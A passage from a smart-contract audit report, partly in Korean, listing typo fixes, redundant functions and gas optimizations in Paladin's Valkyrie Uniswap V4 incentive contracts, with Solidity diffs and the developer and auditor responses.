* `IncentiveManager`:
```diff
contract IncentiveManager is Owner, ReentrancyGuard {
    using IncentivizedPoolIdLibrary for IncentivizedPoolKey;

    /// @notice Struct representing an Incentive System
    struct IncentiveSystem {
--      /// @notice Address of the Incentive logix
++      /// @notice Address of the Incentive logic
        address system;
        /// @notice Flag to notify the system when a swap occurs
        bool updateOnSwap;
    }
    ...
--  /// @notice Notifies the initialization of a pool buy a listed Hook
++  /// @notice Notifies the initialization of a pool by a listed Hook
    /// @param id PoolId for the given pool
    /// @param lpToken Address of the liquidity token associated with the pool
    function notifyInitialize(PoolId id, address lpToken) external onlyAllowedHooks {
        ...
    }
    ...
--  function notifyAddLiquidty(PoolId id, address lpToken, address account, int256 liquidityDelta)
++  function notifyAddLiquidity(PoolId id, address lpToken, address account, int256 liquidityDelta)
        external
        onlyAllowedHooks
    {
        ...
    }
--  function notifyRemoveLiquidty(PoolId id, address lpToken, address account, int256 liquidityDelta)
++  function notifyRemoveLiquidity(PoolId id, address lpToken, address account, int256 liquidityDelta)
        external
        onlyAllowedHooks
    {
        ...
    }
}
```

* `IncentivesZap`:
```diff
--  /// @title IncetivesZap
++  /// @title IncentivesZap
    /// @author Koga - Paladin
--  /// @notice Contract to claim rewards accross multiple IncentiveLogic contracts
++  /// @notice Contract to claim rewards across multiple IncentiveLogic contracts
    contract IncentivesZap {
        using IncentivizedPoolIdLibrary for IncentivizedPoolKey;

          /// @notice Parameters for claiming incentives
          struct ClaimedParams {
              address source;
              IncentivizedPoolId id;
              address account;
          }

          /// @notice Claims multiple incentives from multiple IncentiveLogic contracts at once
          /// @param params Array of ClaimedParams
          function claimZap(ClaimedParams[] calldata params) external {
              // @gas cheaper not to cache length for calldata array input
              for(uint256 i; i < params.length; i++) {
                  IIncentiveLogic(params[i].source).claimAll(params[i].id, params[i].account, params[i].account);
              }
          }

      }
```

* `ValkyrieSubscriber`:
```diff
      /// @title ValkyrieSubscriber
      /// @author Koga - Paladin
--  /// @notice Subsciber contract to connect UniswapV4 PositionManager with the IncentiveManager
++  /// @notice Subscriber contract to connect UniswapV4 PositionManager with the IncentiveManager
    contract ValkyrieSubscriber is ISubscriber {
        ...
        /// @notice Error emitted when a tokenId is not subscribed
--      error NotSubsribed();
++      error NotSubscribed();
        ...
    }
```

**Paladin:** 커밋 [`9272153`](https://github.com/PaladinFinance/Valkyrie/pull/5/commits/92721532aafc3a1a287c0acd70b345aaa2753562)으로 수정되었습니다.

**Cyfrin:** 검증되었습니다. 오류가 수정되었습니다.


### Unnecessary `BoostedIncentiveLogic` functions can be removed

**Description:** * `BoostedIncentiveLogic::_updateRewardState`는 `BaseIncentiveLogic` 구현을 오버라이드합니다; 그러나 두 함수는 정확히 동일한 구현을 가지므로 오버라이드할 필요가 없습니다.

* `updateUserState`가 정확히 동일한 상태 변경을 수행하므로 `BoostedIncentiveLogic::updateUserBoostedBalance`는 완전히 불필요합니다:

```solidity
function updateUserState(IncentivizedPoolId id, address account) external override nonReentrant {
    _updateAllUserState(id, account);
    _updateUserBoostedBalance(id, account);
}

function updateUserBoostedBalance(IncentivizedPoolId id, address account) external nonReentrant {
    _updateAllUserState(id, account);
    _updateUserBoostedBalance(id, account);
}
```

**Recommended Mitigation:**
1. 오버라이드된 `_updateRewardState()` 구현을 제거하세요.
2. `updateUserBoostedBalance()` 함수를 제거하고 그 자리에 오버라이드된 `updateUserState()`를 사용하세요.

**Paladin:** 커밋 [`df40bd5`](https://github.com/PaladinFinance/Valkyrie/pull/5/commits/df40bd508cc1efd9dfe04a572d0d7db8178fb6a0)로 수정되었습니다.

**Cyfrin:** 검증되었습니다. 오버라이드된 `_updateRewardState()` 구현과 `updateUserBoostedBalance()` 함수가 제거되었습니다.


### Use `days` keyword for better readability

**Description:** `TimeWeightedIncentiveLogic`은 현재 `MIN_INCREASE_DURATION` 상수를 `3 * 86400`으로 선언합니다. 대신 가독성을 높이기 위해 `3 days`를 사용해야 합니다.

**Paladin:** 커밋 [`8eac91a`](https://github.com/PaladinFinance/Valkyrie/pull/5/commits/8eac91adcdc15f4f501c5f52724c2bbfe3f47e72)로 수정되었습니다.

**Cyfrin:** 검증되었습니다. 이제 `days` 키워드가 사용됩니다.

\clearpage
## Gas Optimization


### Unnecessary native token checks

**Description:** `FullRangeHook::beforeInitialize`는 네이티브 토큰을 명시적으로 처리하여 두 통화의 심볼을 검색하려고 시도합니다; 그러나 Uniswap의 정렬 규칙(`currency0` < `currency1`)에 따르면 `address(0)`로 표현되는 네이티브 토큰이 `currency1`이 되는 것은 불가능합니다.

```solidity
// Prepare the symbol for the LP token to be deployed
string memory symbol0 =
    key.currency0.isAddressZero() ? NATIVE_CURRENCY_SYMBOL : IERC20Metadata(Currency.unwrap(key.currency0)).symbol();
string memory symbol1 =
    key.currency1.isAddressZero() ? NATIVE_CURRENCY_SYMBOL : IERC20Metadata(Currency.unwrap(key.currency1)).symbol();
```

델타 결제 시 컨트랙트로 전송된 네이티브 가치를 반환할 때도 동일한 상황이 발생합니다. 현재 두 토큰이 모두 0 주소인지 확인하지만 실제로는 토큰 0만이 네이티브 토큰이 될 수 있습니다.

```solidity
    /// @dev Settles any deltas after adding/removing liquidity
    function _settleDeltas(address sender, PoolKey memory key, BalanceDelta delta) internal {
        key.currency0.settle(poolManager, sender, uint256(int256(-delta.amount0())), false);
        key.currency1.settle(poolManager, sender, uint256(int256(-delta.amount1())), false);
@>      if (key.currency0.isAddressZero() || key.currency1.isAddressZero()) _returnNative(sender);
    }
```

**Recommended Mitigation:** `currency1`이 네이티브 토큰이 아님을 보장하므로 두 번째 삼항 연산자를 제거할 수 있습니다.

```diff
   string memory symbol0 =
       key.currency0.isAddressZero() ? NATIVE_CURRENCY_SYMBOL : IERC20Metadata(Currency.unwrap(key.currency0)).symbol();
-- string memory symbol1 =
--     key.currency1.isAddressZero() ? NATIVE_CURRENCY_SYMBOL : IERC20Metadata(Currency.unwrap(key.currency1)).symbol();
++ string memory symbol1 = IERC20Metadata(Currency.unwrap(key.currency1)).symbol();
```

네이티브 가치를 반환하려면 토큰 0만 확인하면 됩니다.

```diff
    /// @dev Settles any deltas after adding/removing liquidity
    function _settleDeltas(address sender, PoolKey memory key, BalanceDelta delta) internal {
        key.currency0.settle(poolManager, sender, uint256(int256(-delta.amount0())), false);
        key.currency1.settle(poolManager, sender, uint256(int256(-delta.amount1())), false);
--      if (key.currency0.isAddressZero() || key.currency1.isAddressZero()) _returnNative(sender);
++      if (key.currency0.isAddressZero()) _returnNative(sender);
    }
```

**Paladin:** 인정함(Acknowledged), 변경되지 않음.

**Cyfrin:** 인정함(Acknowledged).


### Unnecessary liquidity read and subtraction operation can be removed

**Description:** `FullRangeHook::addLiquidity`는 다음과 같이 작동합니다:
```solidity
function addLiquidity(AddLiquidityParams calldata params)
    external
    payable
    nonReentrant
    ensure(params.deadline)
    returns (uint128 liquidity)
{
    ...
    // Read the pool liquidity previous to the addition
    uint128 poolLiquidity = poolManager.getLiquidity(poolId);

    // Calculate the amount of liquidity to be added to the pool
    liquidity = LiquidityAmounts.getLiquidityForAmounts(
        sqrtPriceX96,
        TickMath.getSqrtPriceAtTick(MIN_TICK),
        TickMath.getSqrtPriceAtTick(MAX_TICK),
        params.amount0Desired,
        params.amount1Desired
    );

    if (poolLiquidity == 0 && liquidity <= MINIMUM_LIQUIDITY) {
        revert LiquidityDoesntMeetMinimum();
    }
    // Add the liquidity to the pool
    BalanceDelta addedDelta = modifyLiquidity(
        key,
        IPoolManager.ModifyLiquidityParams({
            tickLower: MIN_TICK,
            tickUpper: MAX_TICK,
            liquidityDelta: liquidity.toInt256(),
            salt: 0
        })
    );

    // @gas cache pool's liquidity token
    IncentivizedERC20 poolLiquidityToken = IncentivizedERC20(poolInfo[poolId].liquidityToken);

    uint256 liquidityMinted;
    if (poolLiquidity == 0) {
        ...
    } else {
        // Calculate the amount of LP tokens to mint
@>      liquidityMinted = FullMath.mulDiv(
            poolLiquidityToken.totalSupply(),
            liquidity,
            poolManager.getLiquidity(poolId) - liquidity
        );
        // Mint the LP tokens to the user
        poolLiquidityToken.mint(params.to, liquidityMinted);
    }
    ...
}
```

발행된 유동성의 최종 계산은 총 LP 토큰 공급량에 추가된 유동성을 곱하고 이전 유동성으로 나눈 값입니다. 이전 유동성은 현재 풀 유동성을 가져와서 추가된 유동성을 빼서 계산합니다; 그러나 결과는 항상 이전에 가져온 `poolLiquidity`(추가 전의 풀 유동성)와 동일하므로 이 두 작업은 중복됩니다.

**Recommended Mitigation:**
```diff
    function addLiquidity(AddLiquidityParams calldata params)
        external
        payable
        nonReentrant
        ensure(params.deadline)
        returns (uint128 liquidity)
    {
        ...
        uint128 poolLiquidity = poolManager.getLiquidity(poolId);
        ...
        uint256 liquidityMinted;
        if (poolLiquidity == 0) {
            // permanently lock the first MINIMUM_LIQUIDITY tokens
            liquidityMinted = liquidity - MINIMUM_LIQUIDITY;
            poolLiquidityToken.mint(address(0), MINIMUM_LIQUIDITY);
            // Mint the LP tokens to the user
            poolLiquidityToken.mint(params.to, liquidityMinted);
        } else {
            // Calculate the amount of LP tokens to mint
            liquidityMinted = FullMath.mulDiv(
                poolLiquidityToken.totalSupply(),
                liquidity,
--              poolManager.getLiquidity(poolId) - liquidity
++              poolLiquidity
            );
            // Mint the LP tokens to the user
            poolLiquidityToken.mint(params.to, liquidityMinted);
        }
        ...
    }
```

**Paladin:** 커밋 [`d9450d1`](https://github.com/PaladinFinance/Valkyrie/pull/5/commits/d9450d1c830188ebd0dfc73f190fd2a8b4da2755)로 수정되었습니다.

**Cyfrin:** 검증되었습니다. 이제 캐시된 값이 사용됩니다.


### Unnecessary liquidity sync can be removed

**Description:** `BaseIncentiveLogic::_syncPoolLiquidity` 메서드는 해당 로직 컨트랙트에 대한 스토리지 내 인센티브화된 풀의 내부 유동성 회계를 동기화하는 데 사용되며 한 번만 실행될 것으로 예상됩니다; 그러나 불필요한 경우에도 포함되어 실행할 때마다 가스를 낭비하는 몇 가지 인스턴스가 있습니다.

동기화가 필요한 유일한 위치는 다음과 같습니다:
* 토큰이 예치된 후 총 유동성을 동기화해야 합니다.
* `BaseIncentiveLogic::notifyBalanceChange`가 실행될 때 사용자의 유동성을 동기화해야 합니다.
* `BaseIncentiveLogic::notifyTransfer`가 실행될 때 두 사용자의 유동성을 동기화해야 합니다.

이 세 가지 인스턴스는 다음 스니펫과 같이 이미 제대로 구현되어 있습니다:

```solidity
abstract contract BaseIncentiveLogic is Owner, ReentrancyGuard, IIncentiveLogic {
    ...
    function _updateAllUserState(IncentivizedPoolId id, address account) internal virtual {
        if(!userLiquiditySynced[id][account]) {
            _syncUserLiquidity(id, account);
            userLiquiditySynced[id][account] = true;
        }
        ...
    }

    function notifyBalanceChange(IncentivizedPoolId id, address account, uint256 amount, bool increase)
        external
        virtual
        onlyIncentiveManager
    {
        _updateAllUserState(id, account);   // This syncs user's liquidity

        PoolState storage _state = poolStates[id];
        if (increase) {
            _state.totalLiquidity += amount;
            _state.userLiquidity[account] += amount;
        } else {
            _state.totalLiquidity -= amount;
            _state.userLiquidity[account] -= amount;
        }
    }

    function notifyTransfer(IncentivizedPoolId id, address from, address to, uint256 amount)
        external
        virtual
        onlyIncentiveManager
    {
        _updateAllUserState(id, from);      // This syncs from's liquidity
        _updateAllUserState(id, to);        // This syncs to's liquidity

        PoolState storage _state = poolStates[id];
        _state.userLiquidity[from] -= amount;
        _state.userLiquidity[to] += amount;
    }
}
```

```solidity
contract BasicIncentiveLogic is BaseIncentiveLogic {
    function depositRewards(IncentivizedPoolId id, address token, uint256 amount, uint256 duration)
        external
        override
        nonReentrant
    {
        ...
        IncentiveManager(incentiveManager).addPoolIncentiveSystem(id);
        if(!poolSynced[id]) {
            _syncPoolLiquidity(id);
            poolSynced[id] = true;
        }

        emit RewardsDeposited(id, token, amount, duration);
    }
}
```

**Recommended Mitigation:** 널리 사용되는 `_updateRewardState()` 함수의 각 실행에서 가스를 낭비하지 않도록 다음 유동성 동기화를 제거할 수 있습니다:

```diff
abstract contract BaseIncentiveLogic is Owner, ReentrancyGuard, IIncentiveLogic {
    function _updateRewardState(IncentivizedPoolId id, address token, address account) internal virtual {
        // Sync pool total liquidity if not already done
--      if(!poolSynced[id]) {
--          _syncPoolLiquidity(id);
--          poolSynced[id] = true;
--      }

        RewardData storage _state = poolRewardData[id][token];
        uint96 newRewardPerToken = _newRewardPerToken(id, token).toUint96();
        _state.rewardPerTokenStored = newRewardPerToken;

        uint32 endTimestampCache = _state.endTimestamp;
        _state.lastUpdateTime = block.timestamp < endTimestampCache ? block.timestamp.toUint32() : endTimestampCache;

        // Update user state if an account is provided
        if (account != address(0)) {
--          if(!userLiquiditySynced[id][account]) {
--              _syncUserLiquidity(id, account);
--              userLiquiditySynced[id][account] = true;
--          }

            UserRewardData storage _userState = userRewardStates[id][account][token];
            _userState.accrued = _earned(id, token, account).toUint160();
            _userState.lastRewardPerToken = newRewardPerToken;
        }
    }
    ...
}
```

**Paladin:** 유지되었습니다. 중복되더라도, 훅/구독자가 관리자를 통해 추가되고 이미 사용자에 대한 예치/유동성이 존재하는 엣지 케이스 시나리오, 즉 보상이 예치되어 `_updateRewardState()` 메서드가 `updateUserState()` 또는 유사한 메서드를 통해 호출되지 않아 사용자에 대해 유동성이 올바르게 동기화되지 않는 경우를 방지하기 위해 추가 보안 조치로 필요합니다.

**Cyfrin:** 인정함(Acknowledged).


### Cache `amount` variable should be used within loop to save gas

**Description:** `IncentiveManager::notifyRemoveLiquidty` 내에서 반복적인 형변환을 피하기 위해 `amount` 변수가 할당되지만, 현재 루프 내에서는 사용되지 않습니다.

**Recommended Mitigation:**
```diff
    function notifyRemoveLiquidty(PoolId id, address lpToken, address account, int256 liquidityDelta)
        external
        onlyAllowedHooks
    {
        ...
        uint256 amount = toUint256(-liquidityDelta);
        ...
        if (length > 0) {
            for (uint256 i; i < length;) {
                // Notify the Incentive Logic of the balance change
                IIncentiveLogic(incentiveSystems[_systems[i]].system).notifyBalanceChange(
--                  _id, account, toUint256(-liquidityDelta), false
++                  _id, account, amount, false
                );
                unchecked {
                    ++i;
                }
            }
        }

        poolTotalLiquidity[_id] -= amount;
        poolUserLiquidity[_id][account] -= amount;

        emit LiquidityChange(_id, account, address(0), amount);
    }
```

**Paladin:** 커밋 [`075c846`](https://github.com/PaladinFinance/Valkyrie/pull/5/commits/075c84618e1f94b17ad10afeb6d77ea101195871)으로 수정되었습니다.

**Cyfrin:** 검증되었습니다. 형변환된 amount가 이제 캐시됩니다.


### Cache storage reads in `TimeWeightedIncentiveLogic`

**Description:** 다른 로직 컨트랙트와 달리, `TimeWeightedIncentiveLogic`은 현재 스토리지에서 읽은 보상 분배율을 캐시하지 않습니다.

**Recommended Mitigation:**
```diff
function _depositRewards(
    IncentivizedPoolId id,
    address token,
    uint256 amount,
    uint256 duration,
    uint256 requiredDuration,
    RewardType rewardType
) internal {
    ...
    if (endTimestampCache < block.timestamp) {
        ...
    } else {
        if (msg.sender != distributionManagers[id][token]) revert CallerNotManager();
        if (rewardType != distributionRewardTypes[id][token]) revert CannotChangeParameters();
        if (requiredDuration != distributionRequiredDurations[id][token]) revert CannotChangeParameters();

        // Calculates the remaining duration left for the current distribution
        uint256 remainingDuration = endTimestampCache - block.timestamp;
        if (remainingDuration + duration < MIN_DURATION) revert InvalidDuration();
        // And calculates the new duration
        uint256 newDuration = remainingDuration + duration;

        // Calculates the leftover rewards from the current distribution
--    uint256 leftoverRewards = _state.ratePerSec * remainingDuration;
++    uint96 ratePerSecCache = _state.ratePerSec;
++    uint256 leftoverRewards = ratePerSecCache * remainingDuration;

        // Calculates the new rate
        uint256 newRate = (amount + leftoverRewards) / newDuration;
--      if (newRate < _state.ratePerSec) revert CannotReduceRate();
++      if (newRate < ratePerSecCache) revert CannotReduceRate();

        // Stores the new reward distribution parameters
        _state.ratePerSec = newRate.toUint96();
        _state.endTimestamp = (block.timestamp + newDuration).toUint32();
        _state.lastUpdateTime = (block.timestamp).toUint32();
    }

    IncentiveManager(incentiveManager).addPoolIncentiveSystem(id);
    // Sync pool total liquidity if not already done
    if(!poolSynced[id]) {
        _syncPoolLiquidity(id);
        poolSynced[id] = true;
    }

    emit RewardsDeposited(id, token, amount, duration);
}
```

**Paladin:** 커밋 [`075c846`](https://github.com/PaladinFinance/Valkyrie/pull/5/commits/075c84618e1f94b17ad10afeb6d77ea101195871)으로 수정되었습니다.

**Cyfrin:** 검증되었습니다. 비율(rate)이 이제 캐시됩니다.


### Superfluous assignment can be removed

**Description:** `TimeWeightedIncentiveLogic::_earnedTimeWeigthed` 내에서 `newDuration`이 `maxDuration`을 초과할 때 `maxDuration`을 할당하는 것은 후속 조건부 블록에서 처리되므로 사실상 아무런 작업도 수행하지 않으므로 제거할 수 있습니다.

**Recommended Mitigation:**
```diff
--  if (newDuration >= maxDuration) newDuration = maxDuration;
    uint256 ratio;
    if (newDuration >= maxDuration) {
        uint256 remainingIncreaseDuration = maxDuration - _checkpoint.duration;
        uint256 left = ((((maxDuration - _checkpoint.duration - 1) * UNIT) / 2) / maxDuration);
        ratio =
            ((left * remainingIncreaseDuration) + (UNIT * (timeDiff - remainingIncreaseDuration))) / timeDiff;
    } else {
        ratio = ((((newDuration - _checkpoint.duration - 1) * UNIT) / 2) / maxDuration);
    }
```

**Paladin:** 커밋 [`f8dc21e`](https://github.com/PaladinFinance/Valkyrie/pull/5/commits/f8dc21e765f6b2568ae221dc5e2855181896c6bb)로 수정되었습니다.

**Cyfrin:** 검증되었습니다. 할당이 제거되었습니다.

\clearpage
